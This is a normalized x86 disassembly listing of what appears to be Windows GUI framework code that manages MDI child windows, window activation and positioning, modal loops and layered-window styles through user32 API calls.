mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4548c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436d5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436da0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4548f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436d5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4548c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453584
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4375b8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436da0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4548bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45148c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45148c
jmp r-xdata
sub_453489
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e58
call sub_403a24
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521dc
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b098
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43db40
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453584
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
call sub_44de38
mov ebx eax
sub_4535d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_453628
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_453694
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403430
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4536c0
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_456e44
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403430
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_453860
jmp r-xdata
mov eax ebx
call sub_4538fc
mov dl 0x1
mov eax ebx
call sub_45144c
jmp r-xdata
sub_453764
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_450dd8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_450e24
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4537c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036bc#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403430
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4538fc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453880
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4538f5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4520d8
sub_453918
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_435bb8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_455db8
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4138bc
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_454de8
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44dce8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_453868
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4537c8
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_456bc4
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43db40
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b07
mov eax [ ebp - 0x4 ]
call sub_453860
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_453b07
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bab
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454de8
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_454de8
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413838
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413984
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44dd9c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_453bf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453bf0
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_453c60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_453bf0
pop ecx
mov eax [ esi + 0x34 ]
call sub_449140
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_449150
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_453ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43be90
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403430
sub_453d08
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403430
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_453d38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453d08
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453d38
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453db4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_453d08
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_453d08
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_453d38
pop ecx
test al al
je r-xdata
sub_453e08
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403430
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_453e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453e08
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453e38
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453eb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_453e08
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_453e08
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_453e38
pop ecx
test al al
je r-xdata
sub_453f08
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413840
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_443788
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_453f5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_453f08
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403430
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453fd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419984
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_454014
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43783c
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43850c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45405c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43db40
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43db40
push eax
call RedrawWindow
sub_4541b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44ef60
mov dl 0x5
mov eax ebx
call sub_450cd4
mov dl 0x1
mov eax ebx
call sub_43c71c
mov dl 0x3
mov eax ebx
call sub_450fd0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_454218
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43c5dc
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c448
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43686c
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4372cc
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40405c
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4372dc
mov eax [ ebp - 0xc ]
call sub_40422c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542f6
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov dl 0x1
mov eax esi
call sub_450354
mov edx [ ebp - 0xc ]
mov eax esi
call sub_437388
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045b8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45431c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43a870
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44fa78
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43a834
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403430
inc ebp
dec edi
jne r-xdata
sub_454368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43c5dc
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_454394
